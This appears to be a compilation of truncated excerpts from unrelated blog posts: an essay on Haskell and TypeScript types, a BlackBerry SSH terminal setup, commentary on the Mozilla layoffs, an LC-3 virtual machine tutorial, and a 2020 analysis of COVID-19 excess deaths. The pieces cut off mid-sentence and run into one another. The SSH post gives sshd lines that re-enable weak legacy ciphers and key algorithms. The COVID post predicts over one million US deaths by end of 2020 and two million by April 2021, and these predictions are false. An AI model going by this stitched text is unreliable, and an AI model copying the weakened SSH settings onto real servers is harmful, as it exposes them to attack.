
</div>

<p>Now if we write <code>emptyLike(42) * 10</code>, the typechecker will once again complain, claiming the result could be a string—it can’t “figure out” that when we pass a number, we always get a number back.</p>

<p>When type systems are approached from this perspective, the result is often frustration. The programmer knows that the equivalent untyped JavaScript is perfectly well-behaved, so the typechecker comes off as being the highly unfortunate combination of stubborn yet dim-witted. What’s more, the programmer likely has little mental model of the typechecker’s internal operation, so when types like the above are inferred (not explicitly written), it can be unclear what solutions exist to make the error go away.</p>

<p>At this point, the programmer may give up. “Stupid typechecker,” they grumble, changing the return type of <code>emptyLike</code> to <code>any</code>. “If it can’t even figure this out, can it <em>really</em> be all that useful?”</p>

<p>Sadly, this relationship with the typechecker is all too common, and gradually-typed languages in particular tend to create a vicious cycle of frustration:</p>

<ul>
 <li>
  <p>Gradual type systems are intentionally designed to “just work” on idiomatic code as much as possible, so programmers may not think much about the types except when they get type errors.</p></li>
 <li>
  <p>Furthermore, many programmers using gradually-typed languages are already adept at programming in the underlying dynamically-typed language, so they have working mental models of program operation in terms of the dynamic semantics alone. They are much less likely to develop a rich mental model of the static semantics of the type system because they are used to reasoning without one.</p></li>
 <li>
  <p>Gradually typed languages must support idioms from their dynamically-typed heritage, so they often include ad-hoc special cases (such as, for example, special treatment of <code>typeof</code> checks) that obscure the rules the typechecker follows and make them seem semi-magical.</p></li>
 <li>
  <p>Builtin types are deeply blessed in the type system, strongly encouraging programmers to embrace their full flexibility, but leaving little recourse when they run up against their limits.</p></li>
 <li>
  <p>All this frustration breeds a readiness to override the typechecker using casts or <code>any</code>, which ultimately creates a self-fulfilling prophecy in which the typechecker rarely catches any interesting mistakes because it has been so routinely disabled.</p></li></ul>

<p>The end result of all of this is a defeatist attitude that views the typechecker as a minor tooling convenience at best (i.e. a fancy autocomplete provider) or an active impediment at worst. Who can really blame them? The type system has (unintentionally of course) been designed in such a way so as to lead them into this dead end. The public perception of type systems settles into that of a strikingly literal nitpicker we endure rather than as a tool we actively leverage.</p>



<p>After everything I said above, it may be hard to imagine seeing types any other way. Indeed, through the lens of TypeScript, the “types are restrictions” mentality is incredibly natural, so much so that it seems self-evident. But let’s move away from TypeScript for a moment and focus on a different language, Haskell, which encourages a somewhat different perspective. If you aren’t familiar with Haskell, that’s alright—I’m going to try to keep the examples in this blog post as accessible as possible whether you’ve written any Haskell or not.</p>

<p>Though Haskell and TypeScript are both statically-typed—and both of their type systems are fairly sophisticated—Haskell’s type system is almost completely different philosophically:</p>

<ul>
 <li>
  <p>Haskell does not have subtyping,<sup><a href="#2020-08-13-types-as-axioms-or-playing-god-with-static-types-footnote-2-definition" name="2020-08-13-types-as-axioms-or-playing-god-with-static-types-footnote-2-return">2</a></sup> which means that every value belongs to exactly one type.</p></li>
 <li>
  <p>While JavaScript is built around a small handful of flexible builtin datatypes (booleans, numbers, strings, arrays, and objects), Haskell has essentially no blessed, built-in datatypes other than numbers. Key types such as booleans, lists, and tuples are ordinary datatypes defined in the standard library, no different from types users could define.<sup><a href="#2020-08-13-types-as-axioms-or-playing-god-with-static-types-footnote-3-definition" name="2020-08-13-types-as-axioms-or-playing-god-with-static-types-footnote-3-return">3</a></sup></p></li>
 <li>
  <p>In particular, Haskell is built around the idea that datatypes can be defined with multiple <em>cases</em>, and branching is done via pattern-matching (more on this shortly).</p></li></ul>

<p>Let’s look at a basic Haskell datatype declaration. Suppose we want to define a type that represents a season:</p>

<div>
 <div>
  <pre><span></span><span>data</span> <span>Season</span> <span>=</span> <span>Spring</span> <span>|</span> <span>Summer</span> <span>|</span> <span>Fall</span> <span>|</span> <span>Winter</span>
</pre></div>

</div>

<p>If you are familiar with TypeScript, this may look rather similar to a union type; if you’re familiar with a C-family language, this may remind you more of an enum. Both are on the right track: this defines a new type named <code>Season</code> with four possible values, <code>Spring</code>, <code>Summer</code>, <code>Fall</code>, and <code>Winter</code>.</p>

<p>But what exactly <em>are</em> those values?</p>

<ul>
 <li>
  <p>In TypeScript, we’d represent this type with a union of strings, like this:</p>
  <div>
   <div>
    <pre><span></span><span>type</span> <span>Season</span> <span>=</span> <span>"spring"</span> <span>|</span> <span>"summer"</span> <span>|</span> <span>"fall"</span> <span>|</span> <span>"winter"</span><span>;</span>
</pre></div>

</div>
  <p>Here, <code>Season</code> is a type that can be one of those four strings, but nothing else.</p></li>
 <li>
  <p>In C, we’d represent this type with an enum, like this:</p>
  <div>
   <div>
    <pre><span></span><span>enum</span> <span>season</span> <span>{</span> <span>SPRING</span><span>,</span> <span>SUMMER</span><span>,</span> <span>FALL</span><span>,</span> <span>WINTER</span> <span>};</span>
</pre></div>

</div>
  <p>Here, <code>SPRING</code>, <code>SUMMER</code>, <code>FALL</code>, and <code>WINTER</code> are essentially defined to be global aliases for the integers <code>0</code>, <code>1</code>, <code>2</code>, and <code>3</code>, and the type <code>enum season</code> is essentially an alias for <code>int</code>.</p></li></ul>

<p>So in TypeScript, the values are strings, and in C, the values are numbers. What are they in Haskell? Well… they simply <em>are</em>.</p>

<p>The Haskell declaration invents four completely new constants out of thin air, <code>Spring</code>, <code>Summer</code>, <code>Fall</code>, and <code>Winter</code>. They aren’t aliases for numbers, nor are they symbols or strings. The compiler doesn’t expose anything about how it chooses to represent these values at runtime; that’s an implementation detail. In Haskell, <code>Spring</code> is now a value <em>distinct from all other values</em>, even if someone in a different module were to also use the name <code>Spring</code>. Haskell type declarations let us play god, creating something from nothing.</p>

<p>Since these values are totally unique, abstract constants, what can we actually do with them? The answer is one thing and <em>exactly</em> one thing: we can branch on them. For example, we can write a function that takes a <code>Season</code> as an argument and returns whether or not Christmas occurs during it:</p>

<div>
 <div>
  <pre><span></span><span>containsChristmas</span> <span>::</span> <span>Season</span> <span>-&gt;</span> <span>Bool</span>
<span>containsChristmas</span> <span>season</span> <span>=</span> <span>case</span> <span>season</span> <span>of</span>
  <span>Spring</span> <span>-&gt;</span> <span>False</span>
  <span>Summer</span> <span>-&gt;</span> <span>True</span>  <span>-- southern hemisphere</span>
  <span>Fall</span>   <span>-&gt;</span> <span>False</span>
  <span>Winter</span> <span>-&gt;</span> <span>True</span>  <span>-- northern hemisphere</span>
</pre></div>

</div>

<p><code>case</code> expressions are, to a first approximation, a lot like C-style <code>switch</code> statements (though they can do a lot more than this simple example suggests). Using <code>case</code>, we can also define conversions from our totally unique <code>Season</code> constants to other types, if we want:</p>

<div>
 <div>
  <pre><span></span><span>seasonToString</span> <span>::</span> <span>Season</span> <span>-&gt;</span> <span>S…</span></pre></div></div></article></div></section></div>

<h2 id="using-an-old-blackberry-as-a-portable-ssh-or-telnet-terminal">Using an old BlackBerry as a portable SSH (or Telnet) terminal</h2>
<p>You used to see BlackBerries everywhere. Sites such as CrackBerry detailed sightings of celebrities using them constantly. Nowadays, not so much. However, I believe they still have some usecases today. One of these is as a portable terminal. Here's why one might want to use one of these devices as a terminal:</p>
<ul>
<li>Nice built-in physical keyboard</li>
<li>Long standby battery life
<ul>
<li>Easily swappable batteries (see my Altoids tin filled with batteries below!)</li>
<li>The 7290 I'm using reportedly has a 216 hour standby battery life, and unlike modern phones this number seems to hold up relatively well even with network enabled</li>
</ul></li>
<li>Affordable
<ul>
<li>You can easily find these devices for ~$20 on eBay</li>
<li>You can get a 100 MB data plan from US Mobile for $2/mo. not including fees (closer to $5/mo. with fees)</li>
</ul></li>
<li>Extremely portable
<ul>
<li>Much smaller than other devices one might use for this kind of thing
<ul>
<li>OpenPandora</li>
<li>GPD Pocket</li>
<li>etc.</li>
</ul></li>
<li>Much shorter than most modern phones</li>
<li>Cellular connection means you don't need a wireless router around</li>
</ul></li>
<li>Decently rugged
<ul>
<li>Not nearly as prone to failure after drops as modern smartphones (in my experience)
<ul>
<li>The screen is recessed, so it doesn't take the brunt of falls</li>
</ul></li>
</ul></li>
<li>Easy to setup
<ul>
<li>You can simply browse to <a href="http://xk72.com/wap">http://xk72.com/wap</a> on the phone itself to install an SSH client (MidpSSH) over the air</li>
</ul></li>
</ul>
<p>I've been using a BlackBerry 7290 on the US Mobile network, which still supports GSM for now. It's notable that the SSH negotiation is decently slow (~30-45 seconds), but is decently usable after connected (things are still a little sluggish however). Furthermore, I had to reenable the weak DSA public key algorithm as well. This doesn't bother me so much as I basically have a middleman server that allows this weak standard that I talk to everything else through rather than enabling it on every server.</p>
<p>To make things easier on myself, I wrote an <a href="https://rqsall.com/posts/files/postlogin.txt">interactive script</a> that is sourced by <code>.bashrc</code> upon logging in that asks what I actually want to connect to and then does so for me.</p>
<p>In the future, I might move to a BlackBerry 8700(c/g) as they support EDGE (much faster network speed), have much faster CPUs, and a higher standby time. I am not sure what I am going to do in the long run, as 2G networks in the US will probably all be shut down by the end of the year with 3G soon to follow. I guess I can just enjoy it while it lasts.</p>
<p>Here are the lines I added to my <code>sshd</code> config for the BlackBerry to be able to connect:</p>
<pre><code>HostKeyAlgorithms +ssh-dss
PubkeyAcceptedKeyTypes +ssh-dss
KexAlgorithms +diffie-hellman-group1-sha1
Ciphers +3des-cbc
</code></pre>
<p>And here are some pictures!</p>
<p><img src="https://rqsall.com/posts/files/connected.jpg"></p>
<p><em>Connected and at the interactive prompt</em></p>
<p><img src="https://rqsall.com/posts/files/top.jpg"></p>
<p><em><code>top</code> output from one server</em></p>

<p><em>tl;dr: Some thoughts on Mozilla for people who don’t know Mozilla.</em></p>

<p>By now everyone in the tech world has heard of the major layoffs at
the Mozilla Corporation, the organization that creates and distributes
the Firefox web browser. (For those who haven’t heard, about 250
people were laid off, about a quarter of the work force.) Lots of
people in the tech world have spoken their piece about the
significance of this event and what it means for the future of
Mozilla, the web, and so on.</p>

<p>Rather than write something of and for the tech world, I wanted to
briefly explain what’s going on for those of my readers who don’t know
HTML from XML, and who are more familar with the worlds of nonprofits
and regular old businesses. I used to work for Mozilla, and have more
knowledge of it and (I hope) insight into it than most people, but
I’ve been gone from Mozilla for ten years now. Thus what I write below
is based on observing it from a distance, like seeing an old friend
whose life has long since diverged from mine.</p>

<p>Disclaimer: I work for a tech company, and I don’t usually write about
other tech companies. So I will strongly emphasize that what I write
here are my personal opinions only, and do not represent the positions
of my present employer or past employers.</p>

<h2 id="what-is-mozilla">What is Mozilla?</h2>

<p>Mozilla is actually two things, the Mozilla Foundation and the Mozilla
Corporation, which are often confused and conflated in public
discourse. (There’s actually at least one other piece, but these two
are the main ones.) The Mozilla Foundation, founded in 2003 to take
over development of the source code for the Netscape web browser, is a
501(c)(3) tax-exempt nonprofit organization, with a staff of 80 people
and a budget of about $27 million in 2018, the last year for which
figures are available. The Mozilla Corporation, founded in 2005, is a
for-profit business, wholly owned by the Mozilla Foundation, with a
staff of about a thousand and revenue of about $440 million, again
from the 2018 financials.</p>

<p>This organizational structure was designed to allow the Mozilla
Corporation to engage in business activities which would be
incompatible with 501(c)(3) status, with a portion of the revenues
from those activities directed to the Mozilla Foundation to help fund
its activities. Having a nonprofit parent also means that the
management and employees of the Mozilla Corporation can help serve the
public benefit goals of the Mozilla Foundation, while still having
interesting jobs, being paid reasonably well, and feeling themselves
to be part of the overall Silicon Valley high-tech milieu.</p>

<p>Second: The customers of the Mozilla Corporation are not the users of
Firefox (among whom you may count yourself). The Mozilla Corporation’s
customers are large corporations like Google that pay for things that
will help them make money, most notably having their Internet search
service be the default in the Firefox browser. And to complete the old
saying, “If you’re not the customer…”, then the 200+ million Firefox
users are the product, potential viewers of ads served up by Google or
others.</p>

<p>(The existence of the Firefox browser as a competitor to Google’s
Chrome browser also supposedly helps Google avoid unwelcome antitrust
attention, especially now that Microsoft has abandoned its own browser
development efforts to base its own browser on the Chrome code. But
it’s unclear how important this consideration actually is to Google
senior management.)</p>

<p>In the early days of the Mozilla Corporation these search engine
relationships proved extremely lucrative, jumping from less than $5
million in 2004 to over $50 million in 2005, the first year in which
the Mozilla Corporation reported financial results, and eventually
growing to a high of about $540 million in 2017.</p>

<p>But as the number of Firefox users decreases (due to the growing
market dominance of the Chrome browser), and those users click on
fewer online ads (for example, because they’re spending less during
the COVID-19 pandemic), the willingness of Google and other customers
to pay the Mozilla Corporation for those users decreases
accordingly. Thus the Mozilla Corporation cutting a quarter of its
workforce.</p>

<p>(In contrast, to my knowledge the Mozilla Foundation itself is not
laying off anyone, at least at this time. It gets its funding from a
combination of royalties from the Mozilla Corporation for use of the
Firefox and Mozilla trademarks, government and foundation grants, and
individual donations. For 2018 the royalties accounted for about half
of the Mozilla Foundation’s budget, with grants and individual donations
each accounting for about a quarter of the budget.)</p>

<p>So, if you’re an avid user of the Firefox browser and want to chip in
a few dollars to help support its development, there’s actually no way
for you to do so, at least not at present. Your donations will go to
the Mozilla Foundation, which will use them to help fund its outreach
and advocacy initiatives, of which it has several. The Mozilla
Foundation itself does not develop Firefox—or any other software, to
my knowledge.</p>

<h2 id="whence-mozilla">Whence Mozilla?</h2>

<p>How has Mozilla (or, more correctly, the Mozilla Corporation) come
to its present pass? The best way I can explain it is that the Mozilla
Corporation is not really a business in the way we’d normally think of
a business, profit-focused and subject to market discipline.</p>

<p>Instead you can think of the Mozilla Corporation as being analogous to
the Bell Labs or Xerox PARC of yore, R&amp;D organizations funded by a
seemingly-unending stream of profits earned by other businesses that
enjoyed dominant positions in their respective markets. In this sense
Google is to Mozilla as AT&amp;T was to Bell Labs, or Xerox to Xerox
PARC.</p>

<p>Like Bell Labs and Xerox PARC, the Mozilla Corporation provided a home
for some of the smartest software developers around. Like those
organizations, the Mozila Corporation has initiated a myriad of
projects ranging from the mundane and useful (like the Firefox
browser) to the esoteric and speculative. Like those organizations,
the Mozilla Corporation has given away much of what it has produced in
the form of public goods available to everyone at no charge.</p>

<p>Like Bell Labs and Xerox PARC, the Mozilla Corporation has indulged a
taste for “build it yourself” vertical integration, and in particular
for creating its own bespoke development tools and software stack. For
example, like those organizations the Mozilla Corporation has created
its own operating system (FirefoxOS), its own programming language
(Rust), and (of course) its own graphical user environment in the form
of the Firefox browser (not to mention yet another web browser, this
one more research-oriented, and various experiments in software for
virtual reality environments).</p>

<p>And finally, the Mozilla Corporation is engaged in the same struggle
that Bell Labs and Xerox PARC found themselves in: trying to convert a
research-oriented organization into an actual business, and capture
for itself more of the value that it has been providing to the world
(and to its past, present, and future competitors) for free.</p>

<h2 id="whither-mozilla">Whither Mozilla?</h2>

<p>What will happen to Mozilla, and to the Mozilla Corporation in
particular? The basic situation is that Mozilla has tried to be at
least three things simultaneously: an advocacy organization, a
developer and distributor of mass market consumer software and related
services, and (as noted above) a research lab.</p>

<p>Being an advocacy organization is relatively inexpensive, but the
other two functions are not: software development (including
research-related activities) and branding and marketing together
consumed almost three quarters of the combined Mozilla Corporation and
Foundation expense budget of $450 million in 2018. Thus when COVID-19
hit and the Mozilla Corporation hit a brick wall in terms of search
engine revenue, its choice was apparently either to stop being a
consumer software and services company, or to stop being a research
lab.</p>

<p>In the end Mozilla Corporation senior management apparently decided to
go for being a consumer software and services company, and to ditch
any activities not related to that, including research projects.
Having done so, the Mozilla Corporation faces a number of problems:</p>

<p>First, as noted above the Mozilla ethos is arguably more like that of
an R&amp;D lab than of a business proper. Just getting Mozilla
employees to think of themselves as working in the service of a
profit-driven business, and to act in accordance with that thought
every single day, may be an uphill battle.</p>

<p>Second, Mozilla is arguably becoming superfluous, at least as far as
its own largest customer, Google, is concerned. Google has its own
browser and browser development team, its own research lab, and
presumably an inclination to want to spend its R&amp;D money on things
it can control and direct itself. Google also has the ability and the
opportunity to capture the remaining base of Firefox users, at least
those that are monetizable.</p>

<p>There will always be a core of enthusiastic Firefox users, but a lot
of them switch their search engine to something other than Google, run
ad blockers, and don’t click on online ads. Thus they are for the most
part irrelevant from Google’s point of view. At some point the major
value Firefox has for Google will be as presumed insulation from
antitrust enforcement efforts targeting Chrome, but such insurance,
even if it’s of value to Google, doesn’t necessarily require a large
Firefox user base.</p>

<p>Finally, it’s …</p></section></div>

<section>

<a name="1:1"></a>
<a name="1:2"></a><div><a name="1:2"><h4>2. Introduction</h4></a>
<p>In this tutorial, I will teach you how to write your own virtual machine (VM) that can run assembly language programs, such as my friend's <a href="https://github.com/rpendleton/lc3-2048">2048</a> or my <a href="https://github.com/justinmeiners/lc3-rogue">Roguelike</a>. If you know how to program, but would like to gain a deeper understanding of what is going on inside a computer and better understand how programming languages work, then this project is for you. Writing your own VM may sound a little scary, but I promise that you will find it to be surprisingly simple and enlightening.
</p>
<p>The final code is about 250 lines of C (<a href="https://justinmeiners.github.io/lc3-vm/src/lc3.c">unix</a>, <a href="https://justinmeiners.github.io/lc3-vm/src/lc3-win.c">windows</a>).
All you need to know is how to read basic C or C++ and how to do <a href="https://www.swarthmore.edu/NatSci/echeeve1/Ref/BinaryMath/BinaryMath.html">binary arithmetic</a>.
</p>
<blockquote><p> <strong>Note:</strong> This VM is a <a href="https://en.wikipedia.org/wiki/Literate_programming">literate program</a>. This means you are reading the source code right now! Each piece of code from the project will be shown and explained thoroughly, so you can be sure nothing is left out. The final code was created by <a href="https://github.com/zyedidia/Literate">"weaving"</a> the blocks of code together.
</p>
</blockquote>
<h3> What is a virtual machine?</h3>
<p>A VM is a program that acts like a computer. It simulates a CPU along with a few other hardware components, allowing it to perform arithmetic, read and write to memory, and interact with I/O devices, just like a physical computer. Most importantly, it can understand a machine language which you can use to program it.
</p>
<p>The amount of computer hardware the VM attempts to simulate depends on its purpose. Some VMs are designed to reproduce the behavior of some particular computer, such as video game emulators. Most people don't have an NES lying around anymore, but we can still play NES games by simulating the NES hardware in a program. These emulators must <a href="http://wiki.nesdev.com/w/index.php/Tricky-to-emulate_games">faithfully recreate</a> every <a href="http://wiki.nesdev.com/w/index.php/Emulator_tests">detail</a> and major hardware component of the original device.
</p>
<p>Other VMs don't act like any real computer and are entirely made up! This is primarily done to make software development easier. Imagine you wanted to create a program that ran on multiple computer architectures. A VM could offer a standard platform which provided portability for all of them. Instead of rewriting a program in different dialects of assembly for each CPU architecture, you would only need to write the small VM program in each assembly language. Each program would then be written only once in the VM's assembly language.
</p>

</p>
<p><img src="https://justinmeiners.github.io/lc3-vm/img/vm.gif" alt="vm for each architecture">
</p>
<blockquote><p> <strong>Note:</strong> A compiler solves a similar problem by compiling a standard <em>high-level language</em> to several CPU architectures. A VM creates one standard <em>CPU architecture</em> which is simulated on various hardware devices. One advantage of a compiler is that it has no runtime overhead while a VM does. Even though compilers do a pretty good job, writing a new one that targets multiple platforms is very difficult, so VMs are still helpful here. In practice, VMs and compilers are mixed at various levels.
</p>
</blockquote>
<p>The <a href="https://en.wikipedia.org/wiki/Java_virtual_machine">Java Virtual Machine (JVM)</a> is a very successful example. The JVM itself is a moderately sized program that is small enough for one programmer to understand. This has made it possible to be written for thousands of devices including phones. Once the JVM is implemented on a new device, any Java, Kotlin, or Clojure program ever written can run on it without modification. The only cost is the overhead of the VM itself and the <a href="https://www.joelonsoftware.com/2002/11/11/the-law-of-leaky-abstractions/">further abstraction</a> from the machine. Most of the time, this is a pretty good tradeoff.
</p>
<p>A VM doesn't have to be large or pervasive to provide a similar benefit. Old <a href="https://fabiensanglard.net/anotherWorld_code_review/">video games</a> often used small VMs to provide simple <a href="https://sf2platinum.wordpress.com/page/1/">scripting systems</a>.
</p>
<p>VMs are also useful for executing code in a secure or isolated way. One application of this is garbage collection. There <a href="https://www.lua.org/pil/24.2.html">is no trivial way</a> to implement automatic garbage collection on top of C or C++ since a program cannot see its own stack or variables. However, a VM is “outside” the program it is running and can observe all of the <a href="https://en.wikipedia.org/wiki/Tracing_garbage_collection">memory references</a> on the stack.
</p>
<p>Another example of this behavior is demonstrated by <a href="https://solidity.readthedocs.io/en/v0.4.24/introduction-to-smart-contracts.html">Ethereum smart contracts</a>. Smart contracts are small programs which are executed by each validating node in the blockchain network. This requires the node operators to run programs on their machines that have been written by complete strangers, without any opportunity to scrutinize them beforehand. To prevent a contract from doing malicious things, they are run inside a <a href="http://ethdocs.org/en/latest/introduction/what-is-ethereum.html#ethereum-virtual-machine">VM</a> that has no access to the file system, network, disc, etc. Ethereum is also a good application of the portability features that result when using a VM. Since Ethereum nodes can be run on many kinds of computers and operating systems, the use of a VM allows smart contracts to be written without any consideration of the many platforms they run on.

<a name="1:3"></a><div><a name="1:3"><h4>3. LC-3 Architecture</h4></a>
<p>Our VM will simulate a fictional computer called the <a href="https://en.wikipedia.org/wiki/Little_Computer_3">LC-3</a>. The LC-3 is popular for teaching university students how to program in assembly language. It has a simplified instruction set <a href="http://ref.x86asm.net/coder64.html">compared to x86</a>, but contains all the main ideas used in modern CPUs.
</p>
<p>First, we need to simulate the essential hardware components of the machine. Try to understand what each component is, but don't worry right now if you are unsure of how it fits into the larger picture. Start by creating a C file. Each of the code snippets in this section should be placed in the global scope of this file.
</p>
<h3> Memory</h3>
<p>The LC-3 has 65,536 memory locations (the maximum that is addressable by a 16-bit unsigned integer <code>2^16</code>), each of which stores a 16-bit value. This means it can store a total of only 128kb, which is a lot smaller than you may be used to! In our program, this memory will be stored in a simple array:
</p>

<div>
<p><span>{Memory Storage <a href="https://justinmeiners.github.io/lc3-vm/index.html#1:3">3</a>}</span></p><pre>/* 65536 locations */
uint16_t memory[UINT16_MAX];
</pre>


<p>Used in section <a href="https://justinmeiners.github.io/lc3-vm/index.html#1:11">11</a></p>
</div>
<h3> Registers</h3>
<p>A register is a slot for storing a single value on the CPU. Registers are like the "workbench" of the CPU. For the CPU to work with a piece of data, it has to be in one of the registers. However, since there are just a few registers, only a minimal amount of data can be loaded at any given time. Programs work around this by loading values from memory into registers, calculating values into other registers, and then storing the final results back in memory.
</p>
<p>The LC-3 has 10 total registers, each of which is 16 bits. Most of them are general purpose, but a few have designated roles.
</p>
<ul>
<li>8 general purpose registers  (<code>R0</code>-<code>R7</code>)
</li>
<li>1 program counter (<code>PC</code>) register
</li>
<li>1 condition flags (<code>COND</code>) register
</li>
</ul>
<p>The general purpose registers can be used to perform any program calculations. The program counter is an unsigned integer which is the address of the next instruction in memory to execute. The condition flags tell us information about the previous calculation.
</p>

<div>
<p><span>{Registers <a href="https://justinmeiners.github.io/lc3-vm/index.html#1:3">3</a>}</span></p><pre>enum
{
    R_R0 = 0,
    R_R1,
    R_R2,
    R_R3,
    R_R4,
    R_R5,
    R_R6,
    R_R7,
    R_PC, /* program counter */
    R_COND,
    R_COUNT
};
</pre>



</div>
<p>Just like the memory, we will store the registers in an array:
</p>

<div>
<p><span>{Register Storage <a href="https://justinmeiners.github.io/lc3-vm/index.html#1:3">3</a>}</span></p><pre>uint16_t reg[R_COUNT];
</pre>


<p>Used in section <a href="https://justinmeiners.github.io/lc3-vm/index.html#1:11">11</a></p>
</div>
<h3> Instruction Set</h3>
<p>An instruction is a command which tells the CPU to do some fundamental task, such as add two numbers. Instructions have both an <strong>opcode</strong> which indicates the kind of task to perform and a set of <strong>parameters</strong> which provide inputs to the task being performed.
</p>
<p>Each <strong>opcode</strong> represents one task that the CPU "knows" how to do. There are just 16 opcodes in LC-3. Everything the computer can calculate is some sequence of these simple instructions. Each instruction is 16 bits long, with the left 4 bits storing the opcode. The rest of the bits are used to store the parameters.
</p>
<p>We will discuss, in detail, what each instruction does later. For now, define the following opcodes. Make sure they stay in this order so that they are assigned the proper enum value:
</p>

<div>
<p><span>{Opcodes <a href="https://justinmeiners.github.io/lc3-vm/index.html#1:3">3</a>}</span></p><pre>enum
{
    OP_BR = 0, /* branch */
    OP_ADD,    /* add  */
    OP_LD,     /* load */
    OP_ST,     /* store */
    OP_JSR,    /* jump register */
    OP_AND,    /* bitwise and */
    OP_LDR,    /* load register */
    OP_STR,    /* store register */
    OP_RTI,    /* unused */
    OP_NOT,    /* bitwise not */
    OP_LDI,    /* load indirect */
    OP_STI,    /* store indirect */
    OP_JMP,    /* jump */
    OP_RES,    /* reserved (unused) */
    OP_LEA,    /* load effective address */
    OP_TRAP    /* execute trap */
};
</pre>



</div>
<blockquote><p> <strong>Note:</strong> The Intel x86 architecture has hundreds of instructions, while others such as ARM and LC-3 have very few. Small instruction sets are referred to as <a href="https://en.wikipedia.org/wiki/Reduced_instruction_set_computer">RISCs</a> while larger ones are called <a href="https://en.wikipedia.org/wiki/Complex_instruction_set_computer">CISCs</a>. Larger instruction sets typically do not provide any fundamentally new possibilities, but they <a href="https://cs.stanford.edu/people/eroberts/courses/soco/projects/risc/risccisc/">often make it more convenient</a> to write assembly for. A single instruction in CISC might take the place of several in RISC. However, they tend to be more complex and expensive for engineers to design and manufacture. This and other tradeoffs cause the designs to come <a href="https://cs.stackexchange.com/questions/269/why-would-anyone-want-cisc">in and out of style</a>.
</p>
</blockquote>
<h3> Condition Flags</h3>
<p>The <code>R_COND</code> register stores condition flags which provide information about the most recently executed calculation. This allows programs to check logical conditions such as <code>if (x &gt; 0) { ... }</code>.
</p>
<p>Each CPU has a variety of condition flags to signal various situations. The LC-3 uses only 3 condition flags which indicate the sign of the previous calculation.
</p>

<div>
<p><span>{Condition Flags <a href="https://justinmeiners.github.io/lc3-vm/index.html#1:3">3</a>}</span></p><pre>enum
{
    FL_POS = 1 &lt;&lt; 0, /* P */
    FL_ZRO = 1 &lt;&lt; 1, /* Z */
    FL_NEG = 1 &lt;&lt; 2, /* N */
};
</pre>



</div>
<blockquote><p> <strong>Note:</strong> (The <code>&lt;&lt;</code> symbol is called the <a href="https://msdn.microsoft.com/en-us/library/336xbhcz.aspx">left bitshift operator</a>. <code>(n &lt;&lt; k)</code> shifts the bits of <code>n</code> to the left <code>k</code> places. Thus <code>1 &lt;&lt; 2</code> will equal <code>4</code>. Read that link if you are not familiar. It will be important.)
</p>
</blockquote>
<p>We are finished setting up the hardware components of our VM! After adding standard includes (see reference), your file should look something like this:
</p>

<div>
<p><span>{<strong>lc3.c</strong> <a href="https://justinmeiners.github.io/lc3-vm/index.html#1:3">3</a>}</span></p><pre><span>{Includes, <a href="https://justinmeiners.github.io/lc3-vm/index.html#1:12">12</a>}</span>

<p>Now let's look at an LC-3 assembly program to get an idea of what the VM actually runs. You don't need to know how to program assembly or understand everything that is going on. Just try to get a general idea of what is going on. Here is a simple "Hello World":

<div>
<p><a href="https://austingwalters.com/covid-19-u-s-fatalities-june-2020-update/" target="_blank" rel="noopener noreferrer">In June</a>, I made the prediction that it’s likely we’ll see hundreds of thousands dead by July from COVID-19.</p>
<p>According to official data, my prediction <span><em>was not entirely accurate</em></span>, being closer to the lower bound of my simulation(s) (a hundred thousand).</p>
<p>Today, we have more information about the virus and importantly improved data on death rates (via the CDC) – <strong>it appears the official death toll from COVID19 may be under reported</strong>. Perhaps more terrifying, it also appears <strong>if you are 25-85+ years old you have a 20-50% increased risk of dying in 2020 than you did in 2015-2019</strong> (given COVID19’s current penetration rate).</p>
<p>Some key takeaways from this analysis:</p>
<ul>
<li>Official death COVID19 related deaths are likely higher than official count(s)</li>
<li>Testing capacity appears to be shrinking or not being reported</li>
<li>Age groups over 25 are seeing a 20-50% increased number of deaths in 2020 (over 2015-2019)</li>
<li>It is likely the increased fatality rate over prior years will continue as COVID19 prevalence increases</li>
<li>By year end 2020, it’s likely we will see over one million deaths in the U.S.</li>
<li>By April 2021, it’s likely we will see over two million deaths in the U.S.</li>
</ul>

<li>CDC data is only [mostly] accurate up to the week of July 20 – 26, 2020</li>
</ul>
</li>
</ul>

<p>First and foremost, we aren’t testing enough to capture all cases. People are not being tested for various reasons: desire to work, no/minor symptoms, can’t receive a test, etc. Unfortunately, this will leave us vulnerable.</p>
<p>On a whole, the nation wide positive rate is still hovering well above lows, with around 7% tests coming back positive.</p>

<p>It is not clear if the reduction in tests are from collection errors, reduced testing capacity, issues with the data provider or some other unknown factor.</p>

<p>Overall, our accounting of deaths from the <a href="https://www.cdc.gov/nchs/nvss/vsrr/covid19/excess_deaths.htm" target="_blank" rel="noopener noreferrer">CDC</a> is only accurate up to the week of July 20 – 26, 2020, from week 1 to week 30 there has been 216,569 more deaths in 2020 over 2019.</p>

<p>It’s important to note, that it is not an entirely fair to compare 2019 to 2020, as each year has variance in deaths. With this in mind, I also created a simple regression model, then compared the predicted death count to the actual 2020 deaths and came to figure of <strong>178,598.40 deaths over the predicted number</strong> (remember, this is for the week of July 20, 2020):</p>

<p>Currently, in August — nearly three weeks passed the CDC numbers cut off and deaths are still increasing. At this point, it is likely we are well over 200,000+ deaths beyond the prediction. Further, it is quite possible we are now 250,000+ deaths above the 2019 figures. If true, we are likely under counting COVID related deaths by 40-60%.</p>
<p>This analysis doesn’t take into account mitigating factors (such as less car accidents) as it also doesn’t take into account confounding factors (such as more suicides).</p>
<h2><span>States Under Reporting COVID-19 Related Fatalities</span></h2>
<p>To highlight the clear under reporting of pandemic related fatalities, we can review states, where the issue becomes more pronounced.</p>
<p>Take <strong>Texas</strong>, for instance:</p>
